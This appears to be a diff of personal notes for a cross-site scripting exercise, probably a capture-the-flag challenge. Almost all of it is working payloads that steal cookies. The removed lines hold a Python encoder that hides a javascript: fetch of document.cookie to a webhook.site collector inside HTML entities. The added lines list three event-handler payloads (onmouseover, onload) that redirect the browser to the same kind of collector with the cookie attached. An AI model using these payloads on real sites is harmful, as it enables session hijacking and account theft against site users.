@@ -1,17 +1,14 @@
-https://webhook.site/91b8bafa-4ceb-4e1d-908e-04a5c87c4b2d
+# xss
+https://webhook.site/8e1bdfcd-374a-429f-a697-f18406382d44
+- v1
+```html
+<b onMouseOver="self.location.href='https://webhook.site/8e1bdfcd-374a-429f-a697-f18406382d44'+escape(document.cookie)">test</b>
+```
+- v2 (can't use onload)
+```html
+<iframe onload="self.location.href='https://webhook.site/8e1bdfcd-374a-429f-a697-f18406382d44'+escape(document.cookie)">test</iframe>
+```
+- v3 
+<iframe onMouseOver="self.location.href='https://webhook.site/8e1bdfcd-374a-429f-a697-f18406382d44'+escape(document.cookie)">test</iframe>
 
-content = "javascript:fetch('https://webhook.site/91b8bafa-4ceb-4e1d-908e-04a5c87c4b2d?flag='+document.cookie).then((response) => {return response.json();}).catch((error) => {console.log('no');})"
-result = "<iframe src=&#"
-for i in content:
-    result+=str(ord(i))
-    result+=";&#"
-result = result[:-3]+"><iframe>"
-print(result)
-
-
-
-
-javascript:
-    fetch('https://webhook.site/91b8bafa-4ceb-4e1d-908e-04a5c87c4b2d?flag='+document.cookie).then((response) => 
-           {return response.json();}).catch((error) => 
-           {console.log('no');})
+- v4 
